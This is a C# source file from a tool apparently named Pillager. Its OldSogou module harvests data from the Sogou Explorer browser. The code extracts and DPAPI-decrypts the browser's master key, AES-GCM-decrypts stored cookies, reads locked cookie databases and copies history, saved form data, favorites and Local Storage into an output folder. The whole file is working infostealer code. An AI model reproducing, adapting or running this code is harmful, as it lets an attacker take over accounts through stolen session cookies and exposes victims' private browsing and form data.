using Pillager.Helper;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Pillager.Browsers
{
    internal class OldSogou : ICommand
    {
        public string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "SogouExplorer\\Webkit\\Default");

        public byte[] MasterKey;

        public byte[] GetMasterKey()
        {
            string filePath = Path.Combine(Directory.GetParent(BrowserPath).FullName, "Local State");
            byte[] masterKey = new byte[] { };
            if (!File.Exists(filePath))
                return null;
            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));
            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value));
            }
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);
            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch
            {
                return null;
            }
        }

        private byte[] DecryptData(byte[] buffer)
        {
            byte[] decryptedData = null;
            if (MasterKey is null) return null;
            try
            {
                string bufferString = Encoding.UTF8.GetString(buffer);
                if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11"))
                {
                    byte[] iv = new byte[12];
                    Array.Copy(buffer, 3, iv, 0, 12);
                    byte[] cipherText = new byte[buffer.Length - 15];
                    Array.Copy(buffer, 15, cipherText, 0, buffer.Length - 15);
                    byte[] tag = new byte[16];
                    Array.Copy(cipherText, cipherText.Length - 16, tag, 0, 16);
                    byte[] data = new byte[cipherText.Length - tag.Length];
                    Array.Copy(cipherText, 0, data, 0, cipherText.Length - tag.Length);
                    decryptedData = new AesGcm().Decrypt(MasterKey, iv, null, data, tag);
                }
                else
                {
                    decryptedData = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                }
            }
            catch { }

            return decryptedData;
        }

        public string Sogou_cookies()
        {
            StringBuilder cookies = new StringBuilder();
            string chrome_cookie_path = Path.Combine(BrowserPath, "Cookies");
            if (!File.Exists(chrome_cookie_path)) return null;
            try
            {
                string cookie_tempFile = Path.GetTempFileName();
                try
                {
                    File.Copy(chrome_cookie_path, cookie_tempFile, true);
                }
                catch
                {
                    byte[] ckfile = LockedFile.ReadLockedFile(chrome_cookie_path);
                    if (ckfile != null)
                    {
                        File.WriteAllBytes(cookie_tempFile, ckfile);
                    }
                }
                SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                if (!handler.ReadTable("cookies")) return null;
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string host_key = handler.GetValue(i, "host_key");
                    string name = handler.GetValue(i, "name");
                    string crypt = handler.GetValue(i, "encrypted_value");
                    string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
                    cookies.AppendLine("[" + host_key + "] \t {" + name + "}={" + cookie + "}");
                }

                File.Delete(cookie_tempFile);
            }
            catch { }

            return cookies.ToString();
        }

        public string Sogou_history()
        {
            StringBuilder history = new StringBuilder();
            string sogou_History_path = Path.Combine(Directory.GetParent(Directory.GetParent(BrowserPath).FullName).FullName, "HistoryUrl3.db");
            if (!File.Exists(sogou_History_path)) return null;
            try
            {
                string history_tempFile = Path.GetTempFileName();
                File.Copy(sogou_History_path, history_tempFile, true);
                SQLiteHandler handler = new SQLiteHandler(history_tempFile);
                if (!handler.ReadTable("UserRankUrl")) return null;
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string url = handler.GetValue(i, "id");
                    history.AppendLine(url);
                }
                File.Delete(history_tempFile);
            }
            catch { }
            return history.ToString();
        }

        public override void Save(string path)
        {
            try
            {
                if (!Directory.Exists(BrowserPath)) return;
                MasterKey = GetMasterKey();
                string savepath = Path.Combine(path, "OldSogouExplorer");
                Directory.CreateDirectory(savepath);
                string cookies = Sogou_cookies();
                string history = Sogou_history();
                string FormData3 = Path.Combine(Directory.GetParent(Directory.GetParent(BrowserPath).FullName).FullName, "FormData3.dat");
                string favorite3 = Path.Combine(Directory.GetParent(Directory.GetParent(BrowserPath).FullName).FullName, "favorite3.dat");
                if (File.Exists(FormData3)) File.Copy(FormData3, Path.Combine(savepath, "FormData3.dat"));
                if (File.Exists(favorite3)) File.Copy(favorite3, Path.Combine(savepath, "favorite3.dat"));
                if (!string.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, "OldSogouExplorer_cookies.txt"), cookies, Encoding.UTF8);
                if (!string.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, "OldSogouExplorer_history.txt"), history, Encoding.UTF8);
                if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"), true);
            }
            catch { }
        }
    }
}
